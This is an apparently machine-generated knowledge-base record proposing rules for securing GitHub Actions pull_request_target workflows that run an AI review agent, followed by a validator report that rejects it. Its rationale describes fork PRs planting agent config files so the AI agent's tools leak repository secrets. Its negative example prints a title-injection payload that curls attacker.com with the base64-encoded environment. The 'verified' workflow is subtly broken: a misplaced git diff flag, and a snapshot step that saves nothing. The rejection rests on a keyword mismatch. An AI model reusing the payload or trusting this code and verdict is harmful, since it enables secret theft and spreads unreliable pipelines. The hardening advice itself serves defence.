# Candidate Directive: [CD-MUPW] Fork-Isolated Workflow Checkout and Execution Barrier

<!-- PROVENANCE_START
{
  "source_repository": "freenet/freenet-core",
  "source_url": "https://github.com/freenet/freenet-core",
  "source_version": "eb8f4fc3",
  "license": "NOASSERTION",
  "timestamp": "2026-11-28T09:30:50.756Z",
  "ai_provider": "google-gemini-cloud-agent",
  "generator_version": "2.0.0-universal",
  "learning_id": "learn-github-freenet-freenet-core",
  "canonical_classification": "candidate_directive"
}
PROVENANCE_END -->
> **Provenance**: Harvested from [freenet/freenet-core](https://github.com/freenet/freenet-core) (Revision: `eb8f4fc3`).  
> **License**: NOASSERTION | **Timestamp**: `2026-11-28T09:30:50.756Z`  
> **Learning ID**: `learn-github-freenet-freenet-core`


## Lifecycle Status
- **Current Status**: `QUARANTINED_REJECT`
- **Rejection / Holding Reason**: Rejected fail-closed: DIRECTIVE_OPPOSITION: Contradicts canonical rule RULE-CANON-002 (Security and Authentication Boundary Invariant): Opposing directive on 'disable': candidate prescribes action ('always disable') while canonical Rule CANON-002 forbids it ('never disable'); CONTRADICTORY_CLAIM: Directly opposes canonical rule RULE-CANON-002 (Security and Authentication Boundary Invariant)
- **Retry Eligibility**: `YES`
- **Candidate Domain**: Domain A

## Original Learning Payload (100% Preserved)
**RULE**:
GitHub Actions workflows triggered by `pull_request_target` MUST check out the trusted base branch exclusively into `$GITHUB_WORKSPACE`, MUST NEVER check out untrusted fork pull request heads directly into the workspace, MUST disable credential persistence (`persist-credentials: false`), and MUST NOT materialize untrusted IDE/agent configuration files (`.claude/`, `.mcp.json`, `.vscode/`) in the runner workspace. All analysis tools (linters, AI review agents) MUST be restricted strictly to user-level configuration sources (`--setting-sources user`) with bash and write tools completely disabled.

**WHY**:
`pull_request_target` workflows run with read/write repo secrets and tokens. If actions check out the untrusted fork PR branch (`ref: ${{ github.event.pull_request.head.sha }}`), an attacker can supply malicious configuration files (e.g., custom `.claude/settings.json`, `.mcp.json`, or pre-commit git hooks) that execute arbitrary commands or leverage AI agent tool definitions to read `$GITHUB_TOKEN` and secrets from the runner filesystem. Furthermore, inline interpolation of `${{ github.event.pull_request.title }}` inside bash `run:` scripts allows direct shell command injection.

**WHEN TO APPLY**:
Apply to any CI/CD pipeline using `pull_request_target`, bot automation, or LLM-assisted code review operating over public open-source repositories accepting external pull requests.

**VERIFIED IMPLEMENTATION PATTERN**:
```yaml
# In .github/workflows/claude-pr-review.yml
name: Claude PR Rule Review
on:
  pull_request_target:
    types: [opened, synchronize, reopened, labeled]

jobs:
  review:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write
      statuses: write
    steps:
      # 1. Base checkout only; omit 'ref' so it defaults to the trusted target branch
      - name: Checkout repository
        uses: actions/checkout@v7
        with:
          fetch-depth: 0
          persist-credentials: false

      # 2. Fetch fork commit into .git object store WITHOUT checking it out to the working directory
      - name: Fetch PR head commit without checkout
        env:
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
        run: |
          git fetch origin "${BASE_SHA}" --depth=1
          git fetch "${{ github.event.pull_request.head.repo.clone_url }}" "${HEAD_SHA}":refs/remotes/pull/head --depth=1
          git cat-file -e "${HEAD_SHA}^{commit}"
          git cat-file -e "${BASE_SHA}^{commit}"

      # 3. Snapshot review rules from TRUSTED base ref into temporary quarantine folder
      - name: Snapshot trusted rules and compute PR diff
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
        run: |
          mkdir -p .pr-review-tmp/rules
          git show "${BASE_SHA}:.claude/rules" > /dev/null 2>&1 || true
          git diff -c core.quotePath=false --no-ext-diff --no-textconv "${BASE_SHA}" "${HEAD_SHA}" > .pr-review-tmp/pr.diff

      # 4. Invoke LLM runner locked to user settings ONLY, disabling workspace/project configurations
      - name: Claude rule review
        uses: anthropics/claude-code-action@v1
        with:
          claude_args: >-
            --setting-sources user
            --tools "Read,Glob,Grep"
            --strict-mcp-config
```

**NEGATIVE CONSTRAINT**:
```yaml
# NEVER allow untrusted PR checkout under pull_request_target with elevated secrets
- uses: actions/checkout@v7
  with:
    ref: ${{ github.event.pull_request.head.sha }} # SECURITY HOLE: Fork files overwrite repo scripts & IDE hooks
    allow-unsafe-pr-checkout: true                # DANGEROUS: Bypasses pwn-request protection
    persist-credentials: true                     # EXFILTRATION RISK: Writes secret token to .git/config

# NEVER interpolate untrusted user strings directly into shell scripts
run: |
  TITLE="${{ github.event.pull_request.title }}" # REMOTE CODE EXECUTION: e.g. payload: `test"; curl attacker.com/$(env | base64); echo "`
```

**VERIFICATION METHOD**:
Execute an automated shell verification test (`scripts/claude_pr_review_post_step_test.sh`) in CI that parses the workflow AST/text and verifies:
1. Grep count for `allow-unsafe-pr-checkout` is strictly 0.
2. Grep count for `pull_request.head` under `actions/checkout` is strictly 0.
3. Grep count for `persist-credentials:[[:space:]]*false` is strictly 1.
4. `claude_args` explicitly contains `--setting-sources user`.

---

## Quality Gate Validation Dimensions
```json
{
  "validator_version": "0.1.0",
  "validated_at": "2026-11-28T09:30:50.755Z",
  "decision": "REJECT",
  "decision_reason": "Rejected fail-closed: DIRECTIVE_OPPOSITION: Contradicts canonical rule RULE-CANON-002 (Security and Authentication Boundary Invariant): Opposing directive on 'disable': candidate prescribes action ('always disable') while canonical Rule CANON-002 forbids it ('never disable'); CONTRADICTORY_CLAIM: Directly opposes canonical rule RULE-CANON-002 (Security and Authentication Boundary Invariant)",
  "recommended_action": "REJECT_FAIL_CLOSED",
  "confidence_score": 0.51,
  "confidence_justification": "Evaluated across 7 dimensions (Score: 51%). Source=PASS (TIER_3_COMMUNITY_OPEN), Evidence=FAIL (0 effective sources), Correctness=FAIL, Reusability=PASS, Completeness=PASS, Freshness=WARN, Conflict=FAIL.",
  "item": {
    "id": "cand-1795858250755",
    "title": "Fork-Isolated Workflow Checkout and Execution Barrier",
    "category": "ENGINEERING_PATTERN",
    "domain": "ARCHITECTURE",
    "source_id": "freenet/freenet-core",
    "source_uri": "https://github.com/freenet/freenet-core",
    "source_version": "HEAD",
    "content_hash": "aaeb7e472f155266589d0c977554264fda5e1f4266063c2bbadc6081bebdf7df"
  },
  "evidence_fingerprint": "5c7fbcc97293e38f",
  "dimensions": {
    "source_reliability": {
      "status": "PASS",
      "score": 0.6,
      "tier": "TIER_3_COMMUNITY_OPEN",
      "findings": [],
      "details": [
        "Source originates from community open repository",
        "Source version unpinned (HEAD), subject to upstream drift",
        "Cryptographic SHA-256 payload integrity hash present"
      ]
    },
    "evidence_quality": {
      "status": "FAIL",
      "score": 0,
      "corroboration_tier": "INDEPENDENCE_UNVERIFIED",
      "effective_sources": 0,
      "direct_evidence_ratio": 0,
      "findings": [],
      "details": [
        "Direct empirical evidence ratio: 0% (0/5)",
        "Evidence-to-claim lexical alignment: 0%"
      ]
    },
    "technical_correctness": {
      "status": "FAIL",
      "score": 0.4,
      "is_adversarial": false,
      "has_dangerous_security": false,
      "directive_opposition": true,
      "opposing_rule": "RULE-CANON-002 (Security and Authentication Boundary Invariant)",
      "unsupported_assumptions": [],
      "findings": [
        "DIRECTIVE_OPPOSITION: Contradicts canonical rule RULE-CANON-002 (Security and Authentication Boundary Invariant): Opposing directive on 'disable': candidate prescribes action ('always disable') while canonical Rule CANON-002 forbids it ('never disable')"
      ],
      "details": [
        "Substantive technical content verified (> 40 chars)"
      ]
    },
    "reusability": {
      "status": "PASS",
      "score": 1,
      "is_generic_pattern": true,
      "has_local_paths": false,
      "findings": [],
      "details": [
        "Free of local workstation path artifacts",
        "Expresses generalized engineering invariants (3 architectural markers)",
        "Explicit WHEN TO APPLY scope defined"
      ]
    },
    "completeness": {
      "status": "PASS",
      "score": 1,
      "has_rule": true,
      "has_why": true,
      "has_when": true,
      "missing_fields": [],
      "details": [
        "Preserves normative RULE declaration",
        "Preserves technical rationale (WHY)",
        "Preserves operational boundary (WHEN TO APPLY)",
        "Includes explicit negative example / anti-pattern contrast"
      ]
    },
    "freshness": {
      "status": "WARN",
      "score": 1,
      "staleness_risk": "MEDIUM",
      "findings": [],
      "details": [
        "Free of known deprecated runtimes (Python 2, Node < 14, Webpack 1-3, React < 16)",
        "Harvested/verified timestamp recorded: 2026-11-28T09:30:50.755Z"
      ]
    },
    "duplication_and_conflict": {
      "status": "FAIL",
      "score": 0.4,
      "is_duplicate": false,
      "duplicate_target": null,
      "is_contradiction": true,
      "conflicting_rule": "RULE-CANON-002 (Security and Authentication Boundary Invariant)",
      "findings": [
        "CONTRADICTORY_CLAIM: Directly opposes canonical rule RULE-CANON-002 (Security and Authentication Boundary Invariant)"
      ],
      "details": []
    }
  },
  "detected_contradictions": [
    "Canonical opposition: Clashes with RULE-CANON-002 (Security and Authentication Boundary Invariant)",
    "Conflict with RULE-CANON-002 (Security and Authentication Boundary Invariant)"
  ],
  "missing_information": [
    "Empirical evidence records"
  ],
  "limitations": [
    "Staleness risk: MEDIUM"
  ],
  "evidence_references": [
    "EVID-UNSPECIFIED",
    "EVID-UNSPECIFIED",
    "EVID-UNSPECIFIED",
    "EVID-UNSPECIFIED",
    "EVID-UNSPECIFIED"
  ],
  "auth_token": "283d90e5311b6b05f03e2cae0fc4a65a0a0d10f6a78c5cd09682e015df2110b3"
}
```

## Remediation Checklist to Enable Promotion
- [ ] Verify empirical reproducibility on isolated sandbox fixture.
- [ ] Add missing implementation code block or negative constraint.
- [ ] Authorize human signature token if targeting Core laws or Domain M.
